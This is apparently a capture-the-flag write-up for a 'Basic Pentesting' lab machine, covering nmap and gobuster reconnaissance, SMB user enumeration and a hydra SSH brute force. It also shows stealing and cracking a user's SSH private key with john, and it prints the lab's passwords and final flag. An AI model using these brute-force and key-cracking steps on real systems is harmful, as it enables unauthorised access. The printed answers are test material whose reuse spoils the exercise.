# Basic Pentesting

## Web App Testing and Privilege Escalation

Find the services exposed by the machine

```
# Nmap 7.80 scan initiated Tue Mar 30 20:24:59 2021 as: nmap -sC -sV -vv -oN nmap/first_scan 10.10.154.166
Nmap scan report for 10.10.154.166
Host is up, received syn-ack (0.036s latency).
Scanned at 2021-03-30 20:24:59 BST for 139s
Not shown: 994 closed ports
Reason: 994 conn-refused
PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZXasCfWSXQ9lYiKbTNkPs0T+wFym2lZy229LllhY6iDLrjm7LIkhCcrlgnJQtLxl5NPhlHNVmwhlkcPPiAHwluhMVE5xKihQj3i+Ucx2IwiFvfmCz4AKsWlR6N8IZe55Ltw0lcH9ykuKZddg81X85EVsNbMacJNjjyxAtwQmJt1F5kB1B2ixgjLLOyNWafC5g1h6XbEgB2wiSRJ5UA8rOZaF28YcDVo0MQhsKpQG/5oPmQUsIeJTUA/XkoWCjvXZqHwv8XInQLQu3VXKgv735G+CJaKzplh7FZyXju8ViDSAY8gdhqpJommYxzqu9s1M31cmFg2fT5V1z9s4DP/vd
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP0SXJpgwPf/e9AT9ri/dlAnkob4PqzMjl2Q9lZIVIXeEFJ9sfRkC+tgSjk9PwK0DUO3JU27pmtAkDL4Mtv9eZw=
|   256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAzy8ZacWXbPGeqtuiJCnPP0LYZYZlMj5D1ZY9ldg1wU
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?      syn-ack
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http-proxy  syn-ack
| fingerprint-strings: 
|   JavaRMI, NotesRPC: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 2243
|     Date: Tue, 30 Mar 2021 19:27:16 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|_    Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><bod
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.7
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=3/30%Time=60637B94%P=x86_64-pc-linux-gnu%r(No
SF:tesRPC,95F,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=
SF:utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x202243\r\nDate:\x2
SF:0Tue,\x2030\x20Mar\x202021\x2019:27:16\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Statu
SF:s\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text
SF:/css\">h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;backgroun
SF:d-color:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,san
SF:s-serif;color:white;background-color:#525D76;font-size:16px;}\x20h3\x20
SF:{font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D
SF:76;font-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;col
SF:or:black;background-color:white;}\x20b\x20{font-family:Tahoma,Arial,san
SF:s-serif;color:white;background-color:#525D76;}\x20p\x20{font-family:Tah
SF:oma,Arial,sans-serif;background:white;color:black;font-size:12px;}\x20a
SF:\x20{color:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1p
SF:x;background-color:#525D76;border:none;}</style></head><bod")%r(JavaRMI
SF:,95F,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=utf-8\
SF:r\nContent-Language:\x20en\r\nContent-Length:\x202243\r\nDate:\x20Tue,\
SF:x2030\x20Mar\x202021\x2019:27:16\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\x204
SF:00\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/css\"
SF:>h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;background-colo
SF:r:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-seri
SF:f;color:white;background-color:#525D76;font-size:16px;}\x20h3\x20{font-
SF:family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;fon
SF:t-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color:bla
SF:ck;background-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-seri
SF:f;color:white;background-color:#525D76;}\x20p\x20{font-family:Tahoma,Ar
SF:ial,sans-serif;background:white;color:black;font-size:12px;}\x20a\x20{c
SF:olor:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;back
SF:ground-color:#525D76;border:none;}</style></head><bod");
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
| nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BASIC2<00>           Flags: <unique><active>
|   BASIC2<03>           Flags: <unique><active>
|   BASIC2<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 3650/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 36614/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 37366/udp): CLEAN (Failed to receive data)
|   Check 4 (port 41736/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2021-03-30T15:27:17-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-30T19:27:17
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 30 20:27:19 2021 -- 1 IP address (1 host up) scanned in 139.38 seconds
```

    1. What is the name of the hidden directory on the web server(enter name without /)?

/development

Found using gobuster and nikto
```

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.154.166/
[+] Threads      : 10
[+] Wordlist     : /opt/wordlist/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
=====================================================
/development (Status: 301)
/server-status (Status: 403)
=====================================================
=====================================================
```

```
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.154.166
+ Target Hostname:    10.10.154.166
+ Target Port:        80
+ Start Time:         2021-03-30 20:26:00 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x9e 0x56a870fbc8f28 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /development/: Directory indexing found.
+ OSVDB-3092: /development/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2021-03-30 20:30:14 (GMT1) (254 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Checking out the development page provides information that jan may be using a weak password.

Use brute-forcing to find the username and password

    2. What is the username?

jan

Found by enumerating SMB with enum4linux to get usernames
```
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

    3. What is the password?

armando

Attack SSH with hydra and username jan - `hydra -l jan -P /opt/wordlist/rockyou.txt 10.10.154.166 ssh -v -V -t 16 -I`

`[22][ssh] host: 10.10.154.166   login: jan   password: armando`

    4. What is the name of the other user you found?

kay


Logging in as jan through SSH...

    Enumerate the machine to find any vectors for privilege escalation.

LinPEAS can be copied over through SCP `scp linpeas.sh jan@10.10.154.166:/dev/shm`, however I managed to find a `.ssh` directory that I could read. From this I was able to retrieve kay's RSA private key.

It's encrypted so it is ran through shh2john before being fed to john, who finds the private key password - beeswax. Now we can login with SSH as the kay user. 

Logging in as the kay user allows us to find the final flag by gaining permission to view the `pass.bak` file.

    5. What is the final password you obtain?

`heresareallystrongpasswordthatfollowsthepasswordpolicy$$`